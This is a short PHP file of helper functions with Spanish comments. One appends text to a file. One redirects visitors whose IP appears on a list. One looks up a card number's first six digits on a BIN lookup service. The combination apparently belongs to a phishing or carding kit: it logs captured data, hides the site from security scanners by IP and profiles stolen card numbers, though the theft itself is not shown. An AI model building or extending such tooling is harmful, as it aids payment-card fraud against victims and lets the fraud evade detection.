<?php

function createF($name, $arg) {
    #creamos el archivo con el nombre de la variable $name 
    $ban = fopen($name,"a+");
    #escribimos en el archivo creado el contenido de la variable $arg
    fwrite($ban, $arg."\r\n");
    fclose($ban);
    
    $msg = "";
    #Comprobamos si se creo el archivo y retornamos un mensaje a la variable $msg
    if (file_exists($name)) {
        $msg = "create and write successfull";
    #de lo contrario si hay un error retornamos un mensaje de error a la variable $msg
    }else {
        $msg = "Error not permitions";
    }
    return $msg;
}

function comprobateIP($file_url, $ip, $redirect) {
    $ipArray = file($file_url);
    foreach ($ipArray as $ipTest) {
        if (substr_count($ip, trim($ipTest))) {
            echo '<meta http-equiv="refresh" content="0;url='.$redirect.'">';
        }
    }
}

function binInfo($cc) {
    $bin = substr($cc, 0,6);
    $url = file_get_contents("https://lookup.binlist.net/".$bin."");
    $json = json_decode($url, true);
    return $json;
}